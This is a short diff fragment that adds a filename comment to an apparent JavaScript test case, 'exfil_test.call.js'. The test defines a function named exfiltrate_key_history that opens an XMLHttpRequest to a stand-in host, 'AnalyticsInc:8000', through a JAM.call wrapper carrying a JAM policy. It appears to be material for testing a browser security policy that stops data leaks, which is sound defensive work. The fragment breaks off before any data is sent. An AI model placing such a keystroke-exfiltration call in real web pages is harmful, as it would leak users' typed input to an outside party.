@@ -1,3 +1,4 @@
+// exfil_test.call.js
 function exfiltrate_key_history() {
   xmlhttp = new XMLHttpRequest;
   JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true], JAM.policy.p13);
